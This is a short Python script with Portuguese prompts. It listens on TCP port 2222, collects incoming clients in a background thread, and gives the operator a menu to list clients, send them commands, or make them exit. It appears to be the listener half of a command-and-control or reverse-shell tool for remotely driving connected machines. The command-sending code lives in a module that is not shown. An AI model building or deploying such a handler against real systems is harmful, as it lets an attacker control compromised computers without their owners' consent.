from socket import *
from functions import *
import threading

with socket(AF_INET, SOCK_STREAM) as serve:
    def management(serv):
        while True:
            client, addr = serv.accept()
            clients.append([client, addr])


    serve.bind(("0.0.0.0", 2222))
    serve.listen(5)

    clients = []

    th = threading.Thread(target=management, args=(serve,))
    th.start()

    while True:
        menu()
        try:
            option = int(input("Escolha uma opção: "))

        except:
            print("Digite apenas numeros!")
            continue

        if option == 1:
            mostrar_clients(clients)

        elif option == 2:
            commands(clients)

        elif option == 3:
            command_exit(clients)

        elif option == 4:
            break

    serve.close()
